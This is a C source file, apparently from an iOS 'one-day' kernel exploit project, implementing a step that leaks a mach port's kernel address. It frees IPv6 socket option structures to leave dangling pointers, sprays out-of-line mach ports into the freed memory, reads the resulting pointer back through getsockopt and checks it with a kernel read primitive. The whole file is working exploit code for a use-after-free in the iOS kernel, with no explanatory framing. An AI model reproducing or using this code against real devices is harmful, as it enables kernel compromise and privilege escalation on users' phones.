//
//  get_port.c
//  1_day_iOS
//
//  Created by System on 25/11/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#include "get_port.h"
#include "spray.h"
#include "read.h"
int get_port_addr(mach_port_t port , uint64_t *port_kaddr){
    const uint32_t dangling_pointer_count = 2;
    int *dangling_pointers = (int *)malloc(sizeof(int) * dangling_pointer_count);

    for(int i=0;i<dangling_pointer_count;i++){
        int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
        struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT,
            .npx_mask = SONPX_SETOPTSHUT};
        int res = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
        if (res != 0)
        {
            printf("ERROR!! failed on setsocketopt\n");
        }
        int minmtu = IP6PO_MINMTU_ALL;
        res = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));
        if (res != 0)
        {
            printf("ERROR!! failed on setIPV6opt\n");
        }
        dangling_pointers[i] = s;
    }
    for(int i=0;i<dangling_pointer_count;i++)
        disconnectx(dangling_pointers[i],0,0);
    
    //  we made 64 dangling pointers!!
    
    // now Let's spray to overwrite dangling pointer
    int attempt_to_spray = 20;
    for(int i=0;i<attempt_to_spray;i++){
        if(!spray_ool_ports(sizeof(struct ip6_pktopts) , port)){
            printf("ERROR!! failed on spary_ool_ports");
        }
    }
    for(int j=0;j<dangling_pointer_count;j++){
        int minmtu = -1 ;
        socklen_t size_minmtu = sizeof(minmtu);
        int res = getsockopt(dangling_pointers[j], IPPROTO_IPV6,IPV6_USE_MIN_MTU,&minmtu,&size_minmtu);
        
        if(res != 0){
            printf("failed on getsockopt on MINMTU!!\n");
            continue;
        }
        int prefer_tempaddr = -1;
        socklen_t size_temp = sizeof(prefer_tempaddr);
        res = getsockopt(dangling_pointers[j],IPPROTO_IPV6,IPV6_PREFER_TEMPADDR,&prefer_tempaddr, &size_temp);
        if(res != 0){
            printf("failed on getsockopt on PREFER_TEMPADDR");
            continue;
        }
        uint64_t maybe_port_kaddr = (uint64_t)minmtu << 32 | prefer_tempaddr;
        printf("it is maybe port kaddr : %llx\n",maybe_port_kaddr);
        if(!check_port(maybe_port_kaddr))
            continue;
        
        printf("is is maybe port kaddr : %llx\n",maybe_port_kaddr);
        *port_kaddr = maybe_port_kaddr;
        for(int i=0;i<dangling_pointer_count;i++)
            close(dangling_pointers[i]);
        free(dangling_pointers);
        return 1;
    }
    return 0;

}
    
int check_port(uint64_t port_addr){
    if((port_addr >> 32) != 0xfffffff0){  //check is_looklike kernel_addr
        printf("it is not look like kernel address\n");
        return 0;
    }
    if((port_addr & 0xffffffff) == 0xdeadbeef)
    {printf("it is not look like kernel address\n");
        return 0;
        
    }
    //we will read ipc_bits by ipc_port
    uint8_t buffer[20] = {};
    if(!Read_data(port_addr , buffer,0)){
        printf("Error.. to Read data\n");
        return 0;
    }
    uint32_t check_bit;
    printf("\n");
    memcpy(&check_bit,buffer,4);
    printf("get bit : 0x%x\n",check_bit);
    if( (check_bit & 0xfffffff0) != 0x80000000){
        printf("HMM.. i think it is not good  data\n");
        return 0;
    }
    return 1;
}

